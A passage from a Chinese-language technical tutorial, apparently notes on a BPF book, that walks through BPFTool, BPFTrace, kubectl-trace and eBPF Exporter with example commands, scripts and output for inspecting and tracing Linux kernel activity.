&#125;</span><br></pre></td></tr></table></figure><p>当你知道程序标识符时，你还可以使用BPFTool获取整个程序的转储；当你需要调试编译器生成的BPF字节码时，这会很方便：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog dump xlated id 52</span></span><br><span class="line">       0: (bf) r6 = r1</span><br><span class="line">       1: (69) r7 = *(u16 *)(r6 +192)</span><br><span class="line">       2: (b4) w8 = 0</span><br><span class="line">       3: (55) if r7 != 0x8 goto pc+14</span><br><span class="line">       4: (bf) r1 = r6</span><br><span class="line">       5: (b4) w2 = 16</span><br><span class="line">       6: (bf) r3 = r10</span><br><span class="line">       7: (07) r3 += -4</span><br><span class="line">       8: (b4) w4 = 4</span><br><span class="line">       9: (85) call bpf_skb_load_bytes#7151872</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><p>这个由<code>Systemd</code>加载到我们内核中的程序正在使用帮助程序<code>bpf_skb_load_bytes</code>检查数据包数据。</p><p>如果你想要这个程序更直观的表示，包括指令跳转，你可以在这个命令中使用<code>visual</code>关键字。 这将生成一种格式化的输出，你可以使用<code>dot</code>之类的工具或任何其他可以绘制图形的程序将其转换为图形表示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog dump xlated id 52 visual &amp;&gt; output.out</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dot -Tpng output.out -o visual-graph.png</span></span><br></pre></td></tr></table></figure><p>如果你运行的是<code>5.1</code>或更新版本的内核，还可以访问运行时统计信息。它们告诉你内核在你的BPF程序上花费了多长时间。默认情况下，系统中可能未启用此功能；你需要先运行这个命令，让内核知道它需要向你展示这些数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysctl -w kernel.bpf_stats_enabled=1</span></span><br></pre></td></tr></table></figure><p>启用统计信息后，你将在运行BPFTool时获得另外两条信息：内核运行该程序所花费的总时间<code>(run_time_ns)</code>，以及运行该程序的次数<code>(run_cnt)</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">52: cgroup_skb  tag 7be49e3934a125ba  run_time_ns 14397 run_cnt 39</span><br><span class="line">     loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">     xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br></pre></td></tr></table></figure><p>但是BPFTool不仅允许你检查程序的运行情况；它还允许你将新程序加载到内核中并将其中一些附加到套接字和 <code>cgroup</code>。 例如，我们可以加载我们以前的程序之一并将其固定到BPF文件系统，使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog</span><br><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog show</span><br><span class="line">254: tracepoint  name bpf_prog  tag c6e8e35bea53af79  gpl</span><br><span class="line">loaded_at 2022-05-28T17:06:14+0800  uid 0</span><br><span class="line">xlated 112B  jited 76B  memlock 4096B  map_ids 43</span><br></pre></td></tr></table></figure><h5 id="检查BPF映射"><a href="#检查BPF映射" class="headerlink" title="检查BPF映射"></a>检查BPF映射</h5><p>除了允许检查和操作BPF程序之外，BPFTool还可以让您访问这些程序正在使用的BPF映射。 列出所有映射并按其标识符过滤映射的命令，类似之前看到的show命令。 除了让BPFTool显示prog的信息，还可以显示map的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool map show</span></span><br><span class="line">    52: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    53: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    54: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    55: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br></pre></td></tr></table></figure><p>这些映射与之前看到的附加到程序的标识符相匹配。还可以按ID过滤映射。</p><p>你可以使用BPFTool创建和更新映射并列出映射中的所有元素。创建新映射所需的信息与你在初始化映射时提供的信息相同。我们需要指定要创建的映射类型、键和值的大小及其名称。因为我们没有将映射与程序一起初始化，所以我们还需要将它固定到BPF文件系统，以便我们以后可以使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map create /sys/fs/bpf/counter type array key 4 value 4 entries 5 name counter</span><br></pre></td></tr></table></figure><p>如果在运行该命令后列出系统中的映射，将在列表底部看到新映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map</span><br><span class="line">1: array  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 100  memlock 4096B</span><br><span class="line">45: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br></pre></td></tr></table></figure><p>创建映射后可以像在BPF程序中那样更新和删除元素。</p><p>如果要向映射添加新元素或更新现有元素，可以使用映射更新命令。你可以从前面的示例中获取映射标识符：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0 0</span><br></pre></td></tr></table></figure><p>如果你尝试使用无效的键或值更新元素，BPFTool将返回错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0</span><br><span class="line">Error: value expected 4 bytes got 3</span><br></pre></td></tr></table></figure><p>如果需要检查其值，BPFTool可以提供映射中所有元素的转储。在创建固定大小的数组映射时，可以看到BPF如何将所有元素初始化为空值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map dump id 45</span><br><span class="line">key: 00 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 01 00 00 00  value: 01 00 00 00</span><br><span class="line">key: 02 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 03 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 04 00 00 00  value: 00 00 00 00</span><br><span class="line">Found 5 elements</span><br></pre></td></tr></table></figure><p>BPFTool提供的最强大的选项之一是，你可以将预先创建的映射附加到新程序，并用这些预先分配的映射替换它们初始化的映射。这样你可以从一开始就让程序访问保存的数据，即使你没有编写程序来从BPF文件系统读取映射。 为此，你需要在使用BPFTool加载程序时设置要初始化的映射。可以通过程序加载它时的有序标识符来指定映射，例如，0表示第一个映射，1表示第二个映射，依此类推。还可以通过名称指定映射，这通常更方便：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog_2         map name counter pinned /sys/fs/bpf/counter</span><br></pre></td></tr></table></figure><p>在这个例子中，我们将刚刚创建的映射附加到一个新程序中。在这种情况下，我们将映射替换为它的名称，因为我们知道程序初始化了一个名为counter的映射。 你还可以使用关键字<code>idx</code>使用映射的索引位置，如<code>idx 0</code>。</p><p>当您需要实时调试消息传递时，直接从命令行访问BPF映射很有用。 BPFTool让你以一种更方便的方式直接访问。 除了自省程序和映射之外，你还可以使用BPFTool从内核中提取更多信息。 接下来让我们看看如何访问特定的接口。</p><h5 id="检查附着到特定接口的程序"><a href="#检查附着到特定接口的程序" class="headerlink" title="检查附着到特定接口的程序"></a>检查附着到特定接口的程序</h5><p>有时你会发现自己想知道哪些程序附加到特定接口。BPF 可以加载在<code>cgroup</code>、<code>Perf</code>事件和网络数据包之上工作的程序。子命令<code>cgroup、perf 和 net</code>可以帮助你追溯这些接口上的附着程序。</p><p><code>perf</code>子命令列出所有附加到系统中跟踪点的程序，如<code>kprobes、uprobes和tracepoints</code>； 你可以通过运行 <code>bpftool perf show</code>来查看该列表。</p><p><code>net</code>子命令列出了附加到XDP和Traffic Control的程序。其他附着程序，如套接字过滤器和重用端口程序，只能通过使用<code>iproute2</code>访问。 您可以使用<code>bpftool net show</code>列出XDP和TC的附着程序，就像在其他BPF对象中看到的一样。</p><p>最后，<code>cgroup</code>子命令列出所有附加到<code>cgroup</code>的程序。 这个子命令与你看到的其他命令有些不同。<code>bpftool cgroup show</code>需要你检查的<code>cgroup</code>路径。如果要列出系统中所有<code>cgroup</code>中的所有附着程序，则需要使用<code>bpftool cgroup tree</code>，如下例所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool cgroup tree</span></span><br><span class="line">    CgroupPath</span><br><span class="line">    ID       AttachType      AttachFlags     Name</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">5 ingress</span><br><span class="line">        4        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">3 ingress</span><br><span class="line">        2        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">        7        ingress</span><br><span class="line">        6        egress</span><br></pre></td></tr></table></figure><p>至此，我们已经讨论了如何在终端中输入不同的命令来调试BPF程序。但是，当你最需要这些命令时，记住所有这些命令可能会很麻烦。接下来，我们将描述如何从纯文本文件加载几个命令，以便你可以构建一组方便使用的脚本。</p><h5 id="在批处理模式下加载命令"><a href="#在批处理模式下加载命令" class="headerlink" title="在批处理模式下加载命令"></a>在批处理模式下加载命令</h5><p>当你尝试分析一个或多个系统的行为时，经常反复运行多个命令。最终可能会得到一组经常在工具链中使用的命令。 如果你不想每次都输入这些命令，BPFTool的批处理模式就很适合你。</p><p>使用批处理模式可以将要执行的所有命令写入文件并一次运行所有命令。还可以通过以<code>#</code>开头的行在此文件中写入注释。但是，这种执行模式不是原子的。BPFTool逐行执行命令，如果其中一个命令失败，它将中止执行，使系统处于运行最新成功命令后的状态。</p><p>以下是批处理模式可以处理的文件的简短示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Create a new <span class="built_in">hash</span> map</span></span><br><span class="line">map create /sys/fs/bpf/hash_map type hash key 4 value 4 entries 5 name hash_map</span><br><span class="line"><span class="meta">#</span><span class="bash"> Now show all the maps <span class="keyword">in</span> the system</span></span><br><span class="line">map show</span><br></pre></td></tr></table></figure><p>如果将这些命令保存在名为<code>/tmp/batch_example.txt</code>的文件中，则可以使用<code>bpftool batch file /tmp/batch_example.txt</code>加载它。 当你第一次运行这个命令时，你会得到类似于下面的代码片段的输出，但是如果你再次尝试运行它，这个命令将会退出并且没有输出，因为我们已经有一个名为<code>hash_map</code>的映射在系统，并且批处理执行将在第一行失败：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tmp]# bpftool batch file /tmp/batch_example.txt</span><br><span class="line">46: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">51: hash  name hash_map  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">processed 2 commands</span><br></pre></td></tr></table></figure><h5 id="显示BTF信息"><a href="#显示BTF信息" class="headerlink" title="显示BTF信息"></a>显示BTF信息</h5><p>BPFTool可以显示任何给定二进制对象存在的BPF类型格式(BTF)信息。BTF使用元数据信息对程序结构进行注释，以帮助你调试程序。</p><p>例如，当你将关键字<code>linum</code>添加到<code>prog dump</code>时，它可以为你提供BPF程序中每条指令的源文件和行号。</p><p>BPFTool的最新版本包括一个新的<code>btf</code>子命令，帮助你深入了解程序。此命令的初始重点是可视化结构类型。例如，<code>bpftool btf dump id 54</code>显示了ID为54的程序的所有BTF类型。</p><h4 id="BPFTrace"><a href="#BPFTrace" class="headerlink" title="BPFTrace"></a>BPFTrace</h4><p>BPFTrace是BPF的高级跟踪语言。允许你使用简洁的DSL编写BPF程序，并将它们保存为可以执行的脚本，而无需手动编译和加载它们到内核中。该语言受到其他知名工具的启发，例如<code>awk</code>和<code>DTrace</code>。</p><p>与直接使用BCC或其他BPF工具编写程序相比，使用BPFTrace的优势之一是BPFTrace提供了许多你不需要自己实现的内置功能，例如聚合信息和创建直方图。</p><p>以Centos8为例，如果你安装了<code>epel-release</code>支持，那么一条dnf就可以安装bpftrace</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# dnf install bpftrace</span><br></pre></td></tr></table></figure><p>BPFTrace执行的程序具有简洁的语法。我们可以将它们分为三个部分：<code>header, action blocks, and footer</code>。 <code>header</code>是BPFTrace在加载程序时执行的特殊块；它通常用于在输出顶部打印一些信息，例如序言。同样，<code>footer</code>是一个特殊的块，BPFTrace在终止程序之前执行一次。 <code>header</code>和<code>footer</code>都是BPFTrace程序中的可选部分。一个 BPFTrace程序必须至少有一个<code>action block</code>。<code>action block</code>是我们指定要跟踪的探针以及内核触发这些探针的事件时执行的操作的地方。下一个示例我们将展示这三个部分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">    &#123;</span><br><span class="line">      printf("starting BPFTrace program\n")</span><br><span class="line">&#125;</span><br><span class="line">kprobe:do_sys_open</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">&#125;</span><br><span class="line">END</span><br><span class="line">    &#123;</span><br><span class="line">      printf("exiting BPFTrace program\n")</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>header</code>部分总是用关键字BEGIN标记，而<code>footer</code>部分总是用关键字END标记。 这些关键字由BPFTrace保留。 <code>action block</code>标识符定义了你希望将BPF操作附加到的探测器。在前面的示例中，我们在内核每次打开文件时打印一行日志。</p><p>除了识别程序部分之外，我们已经可以在前面的示例中看到有关语言语法的更多细节。BPFTrace提供了一些帮助程序，这些帮助程序在程序编译时被翻译成BPF代码。 帮助程序<code>printf</code>是C函数<code>printf</code>的包装器，它在你需要时打印程序详细信息。str是一个内置的辅助函数，它将C指针转换为其字符串表示形式。许多内核函数接收指向字符的指针作为参数。这个辅助函数会为你翻译那些指向字符串的指针。</p><p>BPFTrace可以被认为是一种动态语言，因为它不知道内核执行探针时可能收到的参数数量。这就是BPFTrace提供参数辅助函数来访问内核处理的信息的原因。BPFTrace根据块接收的参数数量动态生成这些帮助程序，可以通过其在参数列表中的位置访问信息。在前面的示例中，<code>arg1</code>是对open系统调用中第二个参数的引用，它引用了文件路径。</p><p>要执行此示例，可以将其保存在文件中并使用文件路径作为第一个参数运行BPFTrace：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br></pre></td></tr></table></figure><p>BPFTrace语言在设计时考虑了脚本。在前面的示例中，您已经看到了该语言的简洁版本。 但是，你也可以无需将这些单行程序存储在文件中即可执行它们；可以在执行BPFTrace时使用选项<code>-e</code>运行它们。 如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace -e "kprobe:do_sys_open &#123; @opens[arg1] = count() &#125;"</span><br><span class="line">Attaching 1 probe...</span><br><span class="line">@opens[94865239214048]: 1</span><br><span class="line">@opens[140736438418016]: 1</span><br><span class="line">@opens[140297599132240]: 1</span><br><span class="line">@opens[93945902307104]: 1</span><br><span class="line">@opens[94865239225648]: 1</span><br><span class="line">@opens[94865239215744]: 1</span><br><span class="line">@opens[93945902306496]: 1</span><br><span class="line">@opens[139870543823312]: 1</span><br><span class="line">@opens[139870563935520]: 1</span><br><span class="line">@opens[140267846679600]: 1</span><br><span class="line">@opens[139870563971376]: 1</span><br><span class="line">@opens[94774158865584]: 1</span><br><span class="line">@opens[140449669998819]: 1</span><br><span class="line">@opens[93945902302160]: 1</span><br><span class="line">@opens[93945902300160]: 1</span><br><span class="line">@opens[93907893935248]: 1</span><br></pre></td></tr></table></figure><h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h5><p>当你运行前面的例子时，你可能会得到一个系统不断打开的文件流，直到你按下<code>Ctrl-C</code>退出程序。 那是因为我们告诉BPF打印内核打开的每个文件描述符。在某些情况下，你只想针对特定条件执行<code>action block</code>。 BPFTrace称之为过滤。</p><p>你可以将一个过滤器关联到每个<code>action block</code>。 它们像<code>action block</code>一样评估，但如果过滤器返回false值，则操作不会执行。他们还可以访问该语言的其余部分，包括探测参数和辅助函数。 这些过滤器封装在动作标头之后的两个斜杠中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open /str(arg1) == "/tmp/example.bt"/</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们将我们的动作块优化为仅当内核打开的文件是我们用来存储这个例子的文件时才执行。如果你用新的过滤器运行程序，你会看到它打印了标题，但它在那里停止打印。 这是因为由于我们的新过滤器，之前触发我们操作的每个文件现在都被跳过了。如果你在不同的终端中多次打开示例文件，你将看到当过滤器匹配我们的文件路径时内核如何执行操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    ^Cexiting BPFTrace program</span><br></pre></td></tr></table></figure><h5 id="动态映射"><a href="#动态映射" class="headerlink" title="动态映射"></a>动态映射</h5><p>BPFTrace实现的一项方便的功能是动态映射关联。 它可以动态生成BPF映射，你可以将其用于本书中看到的许多操作。所有映射关联都以字符<code>@</code>开头，后面跟要创建的映射的名称。 还可以通过为它们分配值来关联这些映射中的更新元素。</p><p>如果我们以本节开头的示例为例，我们可以汇总系统打开特定文件的频率。为此，我们需要计算内核在特定文件上运行open系统调用的次数，然后将这些计数器存储在映射中。为了识别这些聚合，我们可以使用文件路径作为映射的键。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open</span><br><span class="line">&#123;</span><br><span class="line"> @opens[str(arg1)] = count()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行程序后输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftrace /tmp/example.bt</span></span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    ^Cexiting BPFTrace program</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl/haswell/libdl.so.2]: 1</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl32/x86_64/libdl.so.2]: 1</span><br><span class="line">    ...</span><br><span class="line">    @opens[/usr/lib/locale/en.utf8/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/lib/locale/en_US/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/share/locale/locale.alias]: 12</span><br><span class="line">    @opens[/proc/8483/cmdline]: 12</span><br></pre></td></tr></table></figure><p>如你所见，BPFTrace在停止程序执行时打印映射的内容。它汇总了内核在我们系统中打开文件的频率。 默认情况下，BPFTrace总是会在它终止时打印它创建的每个映射的内容。 您无需指定要打印的映射；你可以通过使用内置函数clear清除END块内的映射来更改该行为。 这是因为打印映射总是发生在<code>footer</code>块执行之后。</p><h4 id="kubectl-trace"><a href="#kubectl-trace" class="headerlink" title="kubectl-trace"></a>kubectl-trace</h4><p><code>kubectl-trace</code>是Kubernetes命令行kubectl的插件。它可以帮助你在Kubernetes集群中处理BPFTrace程序，而无需安装任何额外的包或模块。它通过使用容器镜像调度一个<code>Kubernetes job</code>来实现这一点，该容器镜像已经安装了运行程序所需的一切。 此镜像称为<code>trace-runner</code>，它也可以在公共Docker中使用。å</p><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><p>你需要使用Go的工具链从其源存储库安装<code>kubectl-trace</code>，因为其开发人员不提供任何二进制包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/iovisor/kubectl-trace/cmd/kubectl-trace</span><br></pre></td></tr></table></figure><p>在Go的工具链编译程序并将其放入路径后，kubectl的插件系统会自动检测到这个新插件。<code>kubectl-trace</code>会在你第一次执行它时自动下载它在集群中运行的Docker镜像。</p><h5 id="检查k8s节点"><a href="#检查k8s节点" class="headerlink" title="检查k8s节点"></a>检查k8s节点</h5><p>可以使用<code>kubectl-trace</code>来定位运行容器的节点和pod，也可以使用它来定位在这些容器上运行的进程。在第一种情况下，你几乎可以运行任何你想要的BPF程序。但是，在第二种情况下只能运行将用户空间探测器附加到这些进程的程序。</p><p>如果要在特定节点上运行BPF程序，则需要一个适当的标识符，以便Kubernetes将作业安排在适当的位置。有了这个标识符之后，运行程序就和运行你之前看到的程序类似。 如下所示我们运行单行来计算文件打开次数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run node/node_identifier -e \</span><br><span class="line">      "kprobe:do_sys_open &#123; @opens[str(arg1)] = count() &#125;"</span><br></pre></td></tr></table></figure><p>我们使用命令<code>kubectl trace run</code>将其安排在特定的集群节点中。 我们使用语法<code>node/...</code>来告诉<code>kubectl-trace</code>我们正在针对集群中的一个节点。如果我们想针对特定的pod，我们可以将<code>node/</code>替换为<code>pod/</code>。</p><p>在特定容器上运行程序更加复杂</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run pod/pod_identifier -n application_name -e &lt;&lt;PROGRAM</span><br><span class="line">    uretprobe:/proc/$container_pid/exe:"main.main" &#123;</span><br><span class="line">      printf("exit: %d\n", retval)</span><br><span class="line">    &#125;</span><br><span class="line">PROGRAM</span><br></pre></td></tr></table></figure><p>在这个命令中有两件事情需要强调。第一个是我们需要容器中运行的应用程序的名称才能找到它的进程； 这对应于我们示例中的<code>application_name</code>， 需要使用在容器中执行的二进制文件的名称，例如<code>nginx</code>或<code>memc ached</code>。 通常，容器只运行一个进程，但这为我们提供了额外的保证，即我们将程序附加到正确的进程。第二个方面是在BPF程序中包含<code>$container_pid</code>。 这不是BPFTrace辅助函数，而是<code>kubectl-trace</code>用作进程标识符替换的占位符。在运行BPF程序之前，<code>trace-runner</code>用适当的标识符替换占位符，并将我们的程序附加到正确的进程。</p><p>在本节和前面几节中，我们专注于更有效地运行BPF程序的工具，即使在容器环境中也是如此。 在下一节中，我们将讨论一个更好的工具，它将BPF程序收集的数据与开源监控系统Prometheus集成在一起。</p><h4 id="eBPF-Exporter"><a href="#eBPF-Exporter" class="headerlink" title="eBPF Exporter"></a>eBPF Exporter</h4><p><code>eBPF Exporter</code>是一个允许你自定义BPF跟踪指标导出到Prometheus的工具。Prometheus是一个高度可扩展的监控和警报系统。与其他监控系统不同的一个关键因素是它使用拉取策略来获取指标，而不是期望客户端将指标推送给它。这允许用户编写可以从任何系统收集指标的自定义导出器，Prometheus使用API模式提取它们。<code>eBPF Exporter</code>实现此API以从BPF程序中获取跟踪指标并将它们导入Prometheus。</p><h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><p>尽管<code>eBPF Exporter</code>提供二进制包，但我们建议从源代码安装它，因为通常没有新版本。从源代码构建还可以让你访问BCC（BPF 编译器集合）之上构建的更新功能。</p><p>要从源代码安装<code>eBPF Exporter</code>，你需要在计算机上已经安装BCC和Go的工具链。 有了这些先决条件后可以使用Go下载和构建二进制文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/cloudflare/ebpf_exporter/...</span><br></pre></td></tr></table></figure><h5 id="从BPF导出指标"><a href="#从BPF导出指标" class="headerlink" title="从BPF导出指标"></a>从BPF导出指标</h5><p><code>eBPF Exporter</code>使用YAML文件进行配置，你可以在其中指定要从系统收集的指标、生成这些指标的BPF程序以及它们如何转换为Prometheus。当 Prometheus向<code>eBPF Exporter</code>发送请求以提取指标时，此工具会将BPF程序正在收集的信息转换为指标值。<code>eBPF Exporter</code>捆绑了许多系统收集非常有用的信息的程序，例如周期指令(IPC)和CPU缓存命中率。</p><p><code>eBPF Exporter</code>的简单配置文件包括三个主要部分。在第一部分中定义了希望Prometheus从系统中提取的指标。 在这里可以将BPF映射中收集的数据转换为Prometheus理解的指标。 如下示例所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">programs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timers</span></span><br><span class="line"><span class="attr">metrics:</span> </span><br><span class="line"><span class="attr">counters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timer_start_total</span></span><br><span class="line"><span class="attr">help:</span> <span class="string">Timers</span> <span class="string">fired</span> <span class="string">in</span> <span class="string">the</span> <span class="string">kernel</span> </span><br><span class="line"><span class="attr">table:</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">labels:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">function</span> </span><br><span class="line"><span class="attr">size:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">decoders:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ksym</span></span><br></pre></td></tr></table></figure><p>我们定义了一个名为<code>timer_start_total</code>的指标，它聚合了内核启动定时器的频率。我们还指定我们希望从名为<code>counts</code>的BPF映射中收集此信息。 